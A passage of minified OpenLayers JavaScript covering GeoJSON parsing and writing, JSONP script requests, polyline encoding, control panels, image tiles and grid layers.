b=[],c=null,d=0,e=a.length;d<e;++d){try{c=this.parseCoords.point.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.LineString(b)},multilinestring:function(a){for(var b=[],c=null,d=0,e=a.length;d<e;++d){try{c=\nthis.parseCoords.linestring.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiLineString(b)},polygon:function(a){for(var b=[],c,d,e=0,f=a.length;e<f;++e){try{d=this.parseCoords.linestring.apply(this,[a[e]])}catch(g){throw g;}c=new OpenLayers.Geometry.LinearRing(d.components);b.push(c)}return new OpenLayers.Geometry.Polygon(b)},multipolygon:function(a){for(var b=[],c=null,d=0,e=a.length;d<e;++d){try{c=this.parseCoords.polygon.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiPolygon(b)},\nbox:function(a){if(2!=a.length)throw\"GeoJSON box coordinates must have 2 elements\";return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(a[0][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[0][1])])])}},write:function(a,b){var c={type:null};if(OpenLayers.Util.isArray(a)){c.type=\"FeatureCollection\";var d=\na.length;c.features=Array(d);for(var e=0;e<d;++e){var f=a[e];if(!f instanceof OpenLayers.Feature.Vector)throw\"FeatureCollection only supports collections of features: \"+f;c.features[e]=this.extract.feature.apply(this,[f])}}else 0==a.CLASS_NAME.indexOf(\"OpenLayers.Geometry\")?c=this.extract.geometry.apply(this,[a]):a instanceof OpenLayers.Feature.Vector&&(c=this.extract.feature.apply(this,[a]),a.layer&&a.layer.projection&&(c.crs=this.createCRSObject(a)));return OpenLayers.Format.JSON.prototype.write.apply(this,\n[c,b])},createCRSObject:function(a){a=a.layer.projection.toString();var b={};a.match(/epsg:/i)&&(a=parseInt(a.substring(a.indexOf(\":\")+1)),b=4326==a?{type:\"name\",properties:{name:\"urn:ogc:def:crs:OGC:1.3:CRS84\"}}:{type:\"name\",properties:{name:\"EPSG:\"+a}});return b},extract:{feature:function(a){var b=this.extract.geometry.apply(this,[a.geometry]),b={type:\"Feature\",properties:a.attributes,geometry:b};null!=a.fid&&(b.id=a.fid);return b},geometry:function(a){if(null==a)return null;this.internalProjection&&\nthis.externalProjection&&(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME.split(\".\")[2];a=this.extract[b.toLowerCase()].apply(this,[a]);return\"Collection\"==b?{type:\"GeometryCollection\",geometries:a}:{type:b,coordinates:a}},point:function(a){return[a.x,a.y]},multipoint:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b},linestring:function(a){for(var b=[],c=0,d=a.components.length;c<\nd;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b},multilinestring:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b},polygon:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b},multipolygon:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(this.extract.polygon.apply(this,[a.components[c]]));return b},collection:function(a){for(var b=\na.components.length,c=Array(b),d=0;d<b;++d)c[d]=this.extract.geometry.apply(this,[a.components[d]]);return c}},CLASS_NAME:\"OpenLayers.Format.GeoJSON\"});OpenLayers.Protocol.Script=OpenLayers.Class(OpenLayers.Protocol,{url:null,params:null,callback:null,callbackTemplate:\"OpenLayers.Protocol.Script.registry.${id}\",callbackKey:\"callback\",callbackPrefix:\"\",scope:null,format:null,pendingRequests:null,srsInBBOX:!1,initialize:function(a){a=a||{};this.params={};this.pendingRequests={};OpenLayers.Protocol.prototype.initialize.apply(this,arguments);this.format||(this.format=new OpenLayers.Format.GeoJSON);if(!this.filterToParams&&OpenLayers.Format.QueryStringFilter){var b=\nnew OpenLayers.Format.QueryStringFilter({srsInBBOX:this.srsInBBOX});this.filterToParams=function(a,d){return b.write(a,d)}}},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.applyDefaults(a,this.options);a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a.filter&&this.filterToParams&&(a.params=this.filterToParams(a.filter,a.params));var b=new OpenLayers.Protocol.Response({requestType:\"read\"}),c=this.createRequest(a.url,a.params,OpenLayers.Function.bind(function(c){b.data=\nc;this.handleRead(b,a)},this));b.priv=c;return b},createRequest:function(a,b,c){c=OpenLayers.Protocol.Script.register(c);var d=OpenLayers.String.format(this.callbackTemplate,{id:c});b=OpenLayers.Util.extend({},b);b[this.callbackKey]=this.callbackPrefix+d;a=OpenLayers.Util.urlAppend(a,OpenLayers.Util.getParameterString(b));b=document.createElement(\"script\");b.type=\"text/javascript\";b.src=a;b.id=\"OpenLayers_Protocol_Script_\"+c;this.pendingRequests[b.id]=b;document.getElementsByTagName(\"head\")[0].appendChild(b);\nreturn b},destroyRequest:function(a){OpenLayers.Protocol.Script.unregister(a.id.split(\"_\").pop());delete this.pendingRequests[a.id];a.parentNode&&a.parentNode.removeChild(a)},handleRead:function(a,b){this.handleResponse(a,b)},handleResponse:function(a,b){b.callback&&(a.data?(a.features=this.parseFeatures(a.data),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,this.destroyRequest(a.priv),b.callback.call(b.scope,a))},parseFeatures:function(a){return this.format.read(a)},\nabort:function(a){if(a)this.destroyRequest(a.priv);else for(var b in this.pendingRequests)this.destroyRequest(this.pendingRequests[b])},destroy:function(){this.abort();delete this.params;delete this.format;OpenLayers.Protocol.prototype.destroy.apply(this)},CLASS_NAME:\"OpenLayers.Protocol.Script\"});(function(){var a=OpenLayers.Protocol.Script,b=0;a.registry={};a.register=function(c){var d=\"c\"+ ++b;a.registry[d]=function(){c.apply(this,arguments)};return d};a.unregister=function(b){delete a.registry[b]}})();OpenLayers.Format.EncodedPolyline=OpenLayers.Class(OpenLayers.Format,{geometryType:\"linestring\",initialize:function(a){OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){var b;if(\"linestring\"==this.geometryType)b=OpenLayers.Geometry.LineString;else if(\"linearring\"==this.geometryType)b=OpenLayers.Geometry.LinearRing;else if(\"multipoint\"==this.geometryType)b=OpenLayers.Geometry.MultiPoint;else if(\"point\"!=this.geometryType&&\"polygon\"!=this.geometryType)return null;a=this.decodeDeltas(a,\n2);for(var c=a.length,d=[],e=0;e+1<c;){var f=a[e++],g=a[e++];d.push(new OpenLayers.Geometry.Point(g,f))}return\"point\"==this.geometryType?new OpenLayers.Feature.Vector(d[0]):\"polygon\"==this.geometryType?new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])):new OpenLayers.Feature.Vector(new b(d))},decode:function(a,b,c){a=this.decodeDeltas(a,b,c||1E5);c=a.length;for(var d=[],e=0;e+(b-1)<c;){for(var f=[],g=0;g<b;++g)f.push(a[e++]);d.push(f)}return d},\nwrite:function(a){a=(a.constructor==Array?a[0]:a).geometry;var b=a.CLASS_NAME.split(\".\")[2].toLowerCase();if(\"point\"==b)a=Array(a);else if(\"linestring\"==b||\"linearring\"==b||\"multipoint\"==b)a=a.components;else if(\"polygon\"==b)a=a.components[0].components;else return null;for(var b=[],c=a.length,d=0;d<c;++d){var e=a[d];b.push(e.y);b.push(e.x)}return this.encodeDeltas(b,2)},encode:function(a,b,c){c=c||1E5;for(var d=[],e=a.length,f=0;f<e;++f)for(var g=a[f],h=0;h<b;++h)d.push(g[h]);return this.encodeDeltas(d,\nb,c)},encodeDeltas:function(a,b,c){var d,e=Array(b);for(d=0;d<b;++d)e[d]=0;for(var f=a.length,g=0;g<f;)for(d=0;d<b;++d,++g){var h=a[g],k=h-e[d];e[d]=h;a[g]=k}return this.encodeFloats(a,c||1E5)},decodeDeltas:function(a,b,c){var d,e=Array(b);for(d=0;d<b;++d)e[d]=0;a=this.decodeFloats(a,c||1E5);c=a.length;for(var f=0;f<c;)for(d=0;d<b;++d,++f)e[d]+=a[f],a[f]=e[d];return a},encodeFloats:function(a,b){for(var c=b||1E5,d=a.length,e=0;e<d;++e)a[e]=Math.round(a[e]*c);return this.encodeSignedIntegers(a)},decodeFloats:function(a,\nb){for(var c=b||1E5,d=this.decodeSignedIntegers(a),e=d.length,f=0;f<e;++f)d[f]/=c;return d},encodeSignedIntegers:function(a){for(var b=a.length,c=0;c<b;++c){var d=a[c],e=d<<1;0>d&&(e=~e);a[c]=e}return this.encodeUnsignedIntegers(a)},decodeSignedIntegers:function(a){a=this.decodeUnsignedIntegers(a);for(var b=a.length,c=0;c<b;++c){var d=a[c];a[c]=d&1?~(d>>1):d>>1}return a},encodeUnsignedIntegers:function(a){for(var b=\"\",c=a.length,d=0;d<c;++d)b+=this.encodeUnsignedInteger(a[d]);return b},decodeUnsignedIntegers:function(a){for(var b=\n[],c=0,d=0,e=a.length,f=0;f<e;++f){var g=a.charCodeAt(f)-63,c=c|(g&31)<<d;32>g?(b.push(c),d=c=0):d+=5}return b},encodeFloat:function(a,b){a=Math.round(a*(b||1E5));return this.encodeSignedInteger(a)},decodeFloat:function(a,b){return this.decodeSignedInteger(a)/(b||1E5)},encodeSignedInteger:function(a){var b=a<<1;0>a&&(b=~b);return this.encodeUnsignedInteger(b)},decodeSignedInteger:function(a){a=this.decodeUnsignedInteger(a);return a&1?~(a>>1):a>>1},encodeUnsignedInteger:function(a){for(var b,c=\"\";32<=\na;)b=(32|a&31)+63,c+=String.fromCharCode(b),a>>=5;return c+=String.fromCharCode(a+63)},decodeUnsignedInteger:function(a){for(var b=0,c=0,d=a.length,e=0;e<d;++e){var f=a.charCodeAt(e)-63,b=b|(f&31)<<c;if(32>f)break;c+=5}return b},CLASS_NAME:\"OpenLayers.Format.EncodedPolyline\"});OpenLayers.Control.Panel=OpenLayers.Class(OpenLayers.Control,{controls:null,autoActivate:!0,defaultControl:null,saveState:!1,allowDepress:!1,activeState:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.controls=[];this.activeState={}},destroy:function(){this.map&&this.map.events.unregister(\"buttonclick\",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments);for(var a,b=this.controls.length-1;0<=b;b--)a=this.controls[b],a.events&&\na.events.un({activate:this.iconOn,deactivate:this.iconOff}),a.panel_div=null;this.activeState=null},activate:function(){if(OpenLayers.Control.prototype.activate.apply(this,arguments)){for(var a,b=0,c=this.controls.length;b<c;b++)a=this.controls[b],(a===this.defaultControl||this.saveState&&this.activeState[a.id])&&a.activate();!0===this.saveState&&(this.defaultControl=null);this.redraw();return!0}return!1},deactivate:function(){if(OpenLayers.Control.prototype.deactivate.apply(this,arguments)){for(var a,\nb=0,c=this.controls.length;b<c;b++)a=this.controls[b],this.activeState[a.id]=a.deactivate();this.redraw();return!0}return!1},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.outsideViewport?(this.events.attachToElement(this.div),this.events.register(\"buttonclick\",this,this.onButtonClick)):this.map.events.register(\"buttonclick\",this,this.onButtonClick);this.addControlsToMap(this.controls);return this.div},redraw:function(){for(var a=this.div.childNodes.length-1;0<=a;a--)this.div.removeChild(this.div.childNodes[a]);\nthis.div.innerHTML=\"\";if(this.active)for(var a=0,b=this.controls.length;a<b;a++)this.div.appendChild(this.controls[a].panel_div)},activateControl:function(a){if(!this.active)return!1;if(a.type==OpenLayers.Control.TYPE_BUTTON)a.trigger();else if(a.type==OpenLayers.Control.TYPE_TOGGLE)a.active?a.deactivate():a.activate();else if(this.allowDepress&&a.active)a.deactivate();else{for(var b,c=0,d=this.controls.length;c<d;c++)b=this.controls[c],b==a||b.type!==OpenLayers.Control.TYPE_TOOL&&null!=b.type||b.deactivate();\na.activate()}},addControls:function(a){OpenLayers.Util.isArray(a)||(a=[a]);this.controls=this.controls.concat(a);for(var b=0,c=a.length;b<c;b++){var d=a[b],e=this.createControlMarkup(d);OpenLayers.Element.addClass(e,d.displayClass+\"ItemInactive\");OpenLayers.Element.addClass(e,\"olButton\");\"\"==d.title||e.title||(e.title=d.title);d.panel_div=e}this.map&&(this.addControlsToMap(a),this.redraw())},createControlMarkup:function(a){return document.createElement(\"div\")},addControlsToMap:function(a){for(var b,\nc=0,d=a.length;c<d;c++)b=a[c],!0===b.autoActivate?(b.autoActivate=!1,this.map.addControl(b),b.autoActivate=!0):(this.map.addControl(b),b.deactivate()),b.events.on({activate:this.iconOn,deactivate:this.iconOff})},iconOn:function(){var a=this.panel_div;a.className=a.className.replace(RegExp(\"\\\\b(\"+this.displayClass+\"Item)Inactive\\\\b\"),\"$1Active\")},iconOff:function(){var a=this.panel_div;a.className=a.className.replace(RegExp(\"\\\\b(\"+this.displayClass+\"Item)Active\\\\b\"),\"$1Inactive\")},onButtonClick:function(a){var b=\nthis.controls;a=a.buttonElement;for(var c=b.length-1;0<=c;--c)if(b[c].panel_div===a){this.activateControl(b[c]);break}},getControlsBy:function(a,b){var c=\"function\"==typeof b.test;return OpenLayers.Array.filter(this.controls,function(d){return d[a]==b||c&&b.test(d[a])})},getControlsByName:function(a){return this.getControlsBy(\"name\",a)},getControlsByClass:function(a){return this.getControlsBy(\"CLASS_NAME\",a)},CLASS_NAME:\"OpenLayers.Control.Panel\"});OpenLayers.Control.Button=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_BUTTON,trigger:function(){},CLASS_NAME:\"OpenLayers.Control.Button\"});OpenLayers.Control.ZoomIn=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&&this.map.zoomIn()},CLASS_NAME:\"OpenLayers.Control.ZoomIn\"});OpenLayers.Control.ZoomOut=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&&this.map.zoomOut()},CLASS_NAME:\"OpenLayers.Control.ZoomOut\"});OpenLayers.Control.ZoomToMaxExtent=OpenLayers.Class(OpenLayers.Control.Button,{trigger:function(){this.map&&this.map.zoomToMaxExtent()},CLASS_NAME:\"OpenLayers.Control.ZoomToMaxExtent\"});OpenLayers.Control.ZoomPanel=OpenLayers.Class(OpenLayers.Control.Panel,{initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.ZoomIn,new OpenLayers.Control.ZoomToMaxExtent,new OpenLayers.Control.ZoomOut])},CLASS_NAME:\"OpenLayers.Control.ZoomPanel\"});OpenLayers.Layer.HTTPRequest=OpenLayers.Class(OpenLayers.Layer,{URL_HASH_FACTOR:(Math.sqrt(5)-1)/2,url:null,params:null,reproject:!1,initialize:function(a,b,c,d){OpenLayers.Layer.prototype.initialize.apply(this,[a,d]);this.url=b;this.params||(this.params=OpenLayers.Util.extend({},c))},destroy:function(){this.params=this.url=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},clone:function(a){null==a&&(a=new OpenLayers.Layer.HTTPRequest(this.name,this.url,this.params,this.getOptions()));\nreturn a=OpenLayers.Layer.prototype.clone.apply(this,[a])},setUrl:function(a){this.url=a},mergeNewParams:function(a){this.params=OpenLayers.Util.extend(this.params,a);a=this.redraw();null!=this.map&&this.map.events.triggerEvent(\"changelayer\",{layer:this,property:\"params\"});return a},redraw:function(a){return a?this.mergeNewParams({_olSalt:Math.random()}):OpenLayers.Layer.prototype.redraw.apply(this,[])},selectUrl:function(a,b){for(var c=1,d=0,e=a.length;d<e;d++)c*=a.charCodeAt(d)*this.URL_HASH_FACTOR,\nc-=Math.floor(c);return b[Math.floor(c*b.length)]},getFullRequestString:function(a,b){var c=b||this.url,d=OpenLayers.Util.extend({},this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&&(c=this.selectUrl(e,c));var e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&&delete d[f];e=OpenLayers.Util.getParameterString(d);return OpenLayers.Util.urlAppend(c,e)},CLASS_NAME:\"OpenLayers.Layer.HTTPRequest\"});OpenLayers.Tile=OpenLayers.Class({events:null,eventListeners:null,id:null,layer:null,url:null,bounds:null,size:null,position:null,isLoading:!1,initialize:function(a,b,c,d,e,f){this.layer=a;this.position=b.clone();this.setBounds(c);this.url=d;e&&(this.size=e.clone());this.id=OpenLayers.Util.createUniqueID(\"Tile_\");OpenLayers.Util.extend(this,f);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners)},unload:function(){this.isLoading&&(this.isLoading=\n!1,this.events.triggerEvent(\"unload\"))},destroy:function(){this.position=this.size=this.bounds=this.layer=null;this.eventListeners&&this.events.un(this.eventListeners);this.events.destroy();this.events=this.eventListeners=null},draw:function(a){a||this.clear();var b=this.shouldDraw();b&&(!a&&!1===this.events.triggerEvent(\"beforedraw\"))&&(b=null);return b},shouldDraw:function(){var a=!1,b=this.layer.maxExtent;if(b){var c=this.layer.map,c=c.baseLayer.wrapDateLine&&c.getMaxExtent();this.bounds.intersectsBounds(b,\n{inclusive:!1,worldBounds:c})&&(a=!0)}return a||this.layer.displayOutsideMaxExtent},setBounds:function(a){a=a.clone();if(this.layer.map.baseLayer.wrapDateLine){var b=this.layer.map.getMaxExtent(),c=this.layer.map.getResolution();a=a.wrapDateLine(b,{leftTolerance:c,rightTolerance:c})}this.bounds=a},moveTo:function(a,b,c){null==c&&(c=!0);this.setBounds(a);this.position=b.clone();c&&this.draw()},clear:function(a){},CLASS_NAME:\"OpenLayers.Tile\"});OpenLayers.Tile.Image=OpenLayers.Class(OpenLayers.Tile,{url:null,imgDiv:null,frame:null,imageReloadAttempts:null,layerAlphaHack:null,asyncRequestId:null,maxGetUrlLength:null,canvasContext:null,crossOriginKeyword:null,initialize:function(a,b,c,d,e,f){OpenLayers.Tile.prototype.initialize.apply(this,arguments);this.url=d;this.layerAlphaHack=this.layer.alpha&&OpenLayers.Util.alphaHack();if(null!=this.maxGetUrlLength||this.layer.gutter||this.layerAlphaHack)this.frame=document.createElement(\"div\"),this.frame.style.position=\n\"absolute\",this.frame.style.overflow=\"hidden\";null!=this.maxGetUrlLength&&OpenLayers.Util.extend(this,OpenLayers.Tile.Image.IFrame)},destroy:function(){this.imgDiv&&(this.clear(),this.frame=this.imgDiv=null);this.asyncRequestId=null;OpenLayers.Tile.prototype.destroy.apply(this,arguments)},draw:function(){var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);a?(this.layer!=this.layer.map.baseLayer&&this.layer.reproject&&(this.bounds=this.getBoundsFromBaseLayer(this.position)),this.isLoading?this._loadEvent=\n\"reload\":(this.isLoading=!0,this._loadEvent=\"loadstart\"),this.renderTile(),this.positionTile()):!1===a&&this.unload();return a},renderTile:function(){if(this.layer.async){var a=this.asyncRequestId=(this.asyncRequestId||0)+1;this.layer.getURLasync(this.bounds,function(b){a==this.asyncRequestId&&(this.url=b,this.initImage())},this)}else this.url=this.layer.getURL(this.bounds),this.initImage()},positionTile:function(){var a=this.getTile().style,b=this.frame?this.size:this.layer.getImageSize(this.bounds),\nc=1;this.layer instanceof OpenLayers.Layer.Grid&&(c=this.layer.getServerResolution()/this.layer.map.getResolution());a.left=this.position.x+\"px\";a.top=this.position.y+\"px\";a.width=Math.round(c*b.w)+\"px\";a.height=Math.round(c*b.h)+\"px\"},clear:function(){OpenLayers.Tile.prototype.clear.apply(this,arguments);var a=this.imgDiv;if(a){var b=this.getTile();b.parentNode===this.layer.div&&this.layer.div.removeChild(b);this.setImgSrc();!0===this.layerAlphaHack&&(a.style.filter=\"\");OpenLayers.Element.removeClass(a,\n\"olImageLoadError\")}this.canvasContext=null},getImage:function(){if(!this.imgDiv){this.imgDiv=OpenLayers.Tile.Image.IMAGE.cloneNode(!1);var a=this.imgDiv.style;if(this.frame){var b=0,c=0;this.layer.gutter&&(b=100*(this.layer.gutter/this.layer.tileSize.w),c=100*(this.layer.gutter/this.layer.tileSize.h));a.left=-b+\"%\";a.top=-c+\"%\";a.width=2*b+100+\"%\";a.height=2*c+100+\"%\"}a.visibility=\"hidden\";a.opacity=0;1>this.layer.opacity&&(a.filter=\"alpha(opacity=\"+100*this.layer.opacity+\")\");a.position=\"absolute\";\nthis.layerAlphaHack&&(a.paddingTop=a.height,a.height=\"0\",a.width=\"100%\");this.frame&&this.frame.appendChild(this.imgDiv)}return this.imgDiv},setImage:function(a){this.imgDiv=a},initImage:function(){if(this.url||this.imgDiv){this.events.triggerEvent(\"beforeload\");this.layer.div.appendChild(this.getTile());this.events.triggerEvent(this._loadEvent);var a=this.getImage(),b=a.getAttribute(\"src\")||\"\";this.url&&OpenLayers.Util.isEquivalentUrl(b,this.url)?this._loadTimeout=window.setTimeout(OpenLayers.Function.bind(this.onImageLoad,\nthis),0):(this.stopLoading(),this.crossOriginKeyword&&a.removeAttribute(\"crossorigin\"),OpenLayers.Event.observe(a,\"load\",OpenLayers.Function.bind(this.onImageLoad,this)),OpenLayers.Event.observe(a,\"error\",OpenLayers.Function.bind(this.onImageError,this)),this.imageReloadAttempts=0,this.setImgSrc(this.url))}else this.isLoading=!1},setImgSrc:function(a){var b=this.imgDiv;a?(b.style.visibility=\"hidden\",b.style.opacity=0,this.crossOriginKeyword&&(\"data:\"!==a.substr(0,5)?b.setAttribute(\"crossorigin\",this.crossOriginKeyword):\nb.removeAttribute(\"crossorigin\")),b.src=a):(this.stopLoading(),this.imgDiv=null,b.parentNode&&b.parentNode.removeChild(b))},getTile:function(){return this.frame?this.frame:this.getImage()},createBackBuffer:function(){if(this.imgDiv&&!this.isLoading){var a;this.frame?(a=this.frame.cloneNode(!1),a.appendChild(this.imgDiv)):a=this.imgDiv;this.imgDiv=null;return a}},onImageLoad:function(){var a=this.imgDiv;this.stopLoading();a.style.visibility=\"inherit\";a.style.opacity=this.layer.opacity;this.isLoading=\n!1;this.canvasContext=null;this.events.triggerEvent(\"loadend\");!0===this.layerAlphaHack&&(a.style.filter=\"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='\"+a.src+\"', sizingMethod='scale')\")},onImageError:function(){var a=this.imgDiv;null!=a.src&&(this.imageReloadAttempts++,this.imageReloadAttempts<=OpenLayers.IMAGE_RELOAD_ATTEMPTS?this.setImgSrc(this.layer.getURL(this.bounds)):(OpenLayers.Element.addClass(a,\"olImageLoadError\"),a.onerror=errorImage(a),this.events.triggerEvent(\"loaderror\"),this.onImageLoad()))},stopLoading:function(){OpenLayers.Event.stopObservingElement(this.imgDiv);\nwindow.clearTimeout(this._loadTimeout);delete this._loadTimeout},getCanvasContext:function(){if(OpenLayers.CANVAS_SUPPORTED&&this.imgDiv&&!this.isLoading){if(!this.canvasContext){var a=document.createElement(\"canvas\");a.width=this.size.w;a.height=this.size.h;this.canvasContext=a.getContext(\"2d\");this.canvasContext.drawImage(this.imgDiv,0,0)}return this.canvasContext}},CLASS_NAME:\"OpenLayers.Tile.Image\"});\nOpenLayers.Tile.Image.IMAGE=function(){var a=new Image;a.className=\"olTileImage\";a.galleryImg=\"no\";return a}();OpenLayers.Layer.Grid=OpenLayers.Class(OpenLayers.Layer.HTTPRequest,{tileSize:null,tileOriginCorner:\"bl\",tileOrigin:null,tileOptions:null,tileClass:OpenLayers.Tile.Image,grid:null,singleTile:!1,ratio:1.5,buffer:0,transitionEffect:\"resize\",numLoadingTiles:0,serverResolutions:null,loading:!1,backBuffer:null,gridResolution:null,backBufferResolution:null,backBufferLonLat:null,backBufferTimerId:null,removeBackBufferDelay:null,className:null,gridLayout:null,rowSign:null,transitionendEvents:[\"transitionend\",\n\"webkitTransitionEnd\",\"otransitionend\",\"oTransitionEnd\"],initialize:function(a,b,c,d){OpenLayers.Layer.HTTPRequest.prototype.initialize.apply(this,arguments);this.grid=[];this._removeBackBuffer=OpenLayers.Function.bind(this.removeBackBuffer,this);this.initProperties();this.rowSign=\"t\"===this.tileOriginCorner.substr(0,1)?1:-1},initProperties:function(){void 0===this.options.removeBackBufferDelay&&(this.removeBackBufferDelay=this.singleTile?0:2500);void 0===this.options.className&&(this.className=this.singleTile?\n\"olLayerGridSingleTile\":\"olLayerGrid\")},setMap:function(a){OpenLayers.Layer.HTTPRequest.prototype.setMap.call(this,a);OpenLayers.Element.addClass(this.div,this.className)},removeMap:function(a){this.removeBackBuffer()},destroy:function(){this.removeBackBuffer();this.clearGrid();this.tileSize=this.grid=null;OpenLayers.Layer.HTTPRequest.prototype.destroy.apply(this,arguments)},clearGrid:function(){if(this.grid){for(var a=0,b=this.grid.length;a<b;a++)for(var c=this.grid[a],d=0,e=c.length;d<e;d++)this.destroyTile(c[d]);\nthis.grid=[];this.gridLayout=this.gridResolution=null}},addOptions:function(a,b){var c=void 0!==a.singleTile&&a.singleTile!==this.singleTile;OpenLayers.Layer.HTTPRequest.prototype.addOptions.apply(this,arguments);this.map&&c&&(this.initProperties(),this.clearGrid(),this.tileSize=this.options.tileSize,this.setTileSize(),this.moveTo(null,!0))},clone:function(a){null==a&&(a=new OpenLayers.Layer.Grid(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.HTTPRequest.prototype.clone.apply(this,\n[a]);null!=this.tileSize&&(a.tileSize=this.tileSize.clone());a.grid=[];a.gridResolution=null;a.backBuffer=null;a.backBufferTimerId=null;a.loading=!1;a.numLoadingTiles=0;return a},moveTo:function(a,b,c){OpenLayers.Layer.HTTPRequest.prototype.moveTo.apply(this,arguments);a=a||this.map.getExtent();if(null!=a){var d=!this.grid.length||b,e=this.getTilesBounds(),f=this.map.getResolution();this.getServerResolution(f);if(this.singleTile){if(d||!c&&!e.containsBounds(a))b&&\"resize\"!==this.transitionEffect&&\nthis.removeBackBuffer(),b&&\"resize\"!==this.transitionEffect||this.applyBackBuffer(f),this.initSingleTile(a)}else(d=d||!e.intersectsBounds(a,{worldBounds:this.map.baseLayer.wrapDateLine&&this.map.getMaxExtent()}))?(!b||\"resize\"!==this.transitionEffect&&this.gridResolution!==f||this.applyBackBuffer(f),this.initGriddedTiles(a)):this.moveGriddedTiles()}},getTileData:function(a){var b=null,c=a.lon,d=a.lat,e=this.grid.length;if(this.map&&e){var f=this.map.getResolution();a=this.tileSize.w;var g=this.tileSize.h,\nh=this.grid[0][0].bounds,k=h.left,h=h.top;if(c<k&&this.map.baseLayer.wrapDateLine)var l=this.map.getMaxExtent().getWidth(),m=Math.ceil((k-c)/l),c=c+l*m;c=(c-k)/(f*a);d=(h-d)/(f*g);f=Math.floor(c);k=Math.floor(d);0<=k&&k<e&&(e=this.grid[k][f])&&(b={tile:e,i:Math.floor((c-f)*a),j:Math.floor((d-k)*g)})}return b},destroyTile:function(a){this.removeTileMonitoringHooks(a);a.destroy()},getServerResolution:function(a){var b=Number.POSITIVE_INFINITY;a=a||this.map.getResolution();if(this.serverResolutions&&\n-1===OpenLayers.Util.indexOf(this.serverResolutions,a)){var c,d,e,f;for(c=this.serverResolutions.length-1;0<=c;c--){e=this.serverResolutions[c];d=Math.abs(e-a);if(d>b)break;b=d;f=e}a=f}return a},getServerZoom:function(){var a=this.getServerResolution();return this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,a):this.map.getZoomForResolution(a)+(this.zoomOffset||0)},applyBackBuffer:function(a){null!==this.backBufferTimerId&&this.removeBackBuffer();var b=this.backBuffer;if(!b){b=\nthis.createBackBuffer();if(!b)return;a===this.gridResolution?this.div.insertBefore(b,this.div.firstChild):this.map.baseLayer.div.parentNode.insertBefore(b,this.map.baseLayer.div);this.backBuffer=b;var c=this.grid[0][0].bounds;this.backBufferLonLat={lon:c.left,lat:c.top};this.backBufferResolution=this.gridResolution}for(var c=this.backBufferResolution/a,d=b.childNodes,e,f=d.length-1;0<=f;--f)e=d[f],e.style.top=(c*e._i*e._h|0)+\"px\",e.style.left=(c*e._j*e._w|0)+\"px\",e.style.width=Math.round(c*e._w)+\n\"px\",e.style.height=Math.round(c*e._h)+\"px\";a=this.getViewPortPxFromLonLat(this.backBufferLonLat,a);c=this.map.layerContainerOriginPx.y;b.style.left=Math.round(a.x-this.map.layerContainerOriginPx.x)+\"px\";b.style.top=Math.round(a.y-c)+\"px\"},createBackBuffer:function(){var a;if(0<this.grid.length){a=document.createElement(\"div\");a.id=this.div.id+\"_bb\";a.className=\"olBackBuffer\";a.style.position=\"absolute\";var b=this.map;a.style.zIndex=\"resize\"===this.transitionEffect?this.getZIndex()-1:b.Z_INDEX_BASE.BaseLayer-\n(b.getNumLayers()-b.getLayerIndex(this));for(var b=0,c=this.grid.length;b<c;b++)for(var d=0,e=this.grid[b].length;d<e;d++){var f=this.grid[b][d],g=this.grid[b][d].createBackBuffer();g&&(g._i=b,g._j=d,g._w=f.size.w,g._h=f.size.h,g.id=f.id+\"_bb\",a.appendChild(g))}}return a},removeBackBuffer:function(){if(this._transitionElement){for(var a=this.transitionendEvents.length-1;0<=a;--a)OpenLayers.Event.stopObserving(this._transitionElement,this.transitionendEvents[a],this._removeBackBuffer);delete 